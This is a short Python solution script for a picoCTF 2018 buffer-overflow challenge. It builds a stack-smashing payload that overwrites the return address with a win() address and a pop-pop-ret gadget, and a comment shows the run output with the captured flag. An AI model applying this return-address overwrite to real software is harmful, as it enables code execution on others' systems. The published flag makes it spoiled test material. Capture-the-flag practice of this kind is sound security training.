import struct

def p(x):
    return struct.pack("I", x)

win = 0x80485cb # Address of the win() function
pop_pop_ret = 0x0804872a

payload = "A" * 108
payload += "B" * 4 # Replace ebp

payload += p(win)
payload += p(pop_pop_ret)
payload += p(0xdeadbeef)
payload += p(0xdeadc0de)

print(payload)

"""
We basically need to use ROP to overwrite the return address and push our own arguments onto the stack.
In order to set the value of the two arguments, we need to use a pop;pop;ret ROP gadget, which we can find using
something like ropshell.com

james9909@pico-2018-shell-3:/problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa$ python ~/payload.py  | ./vuln
Please enter your string:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBﾭ
picoCTF{addr3ss3s_ar3_3asy1b78b0d8}Segmentation fault
"""
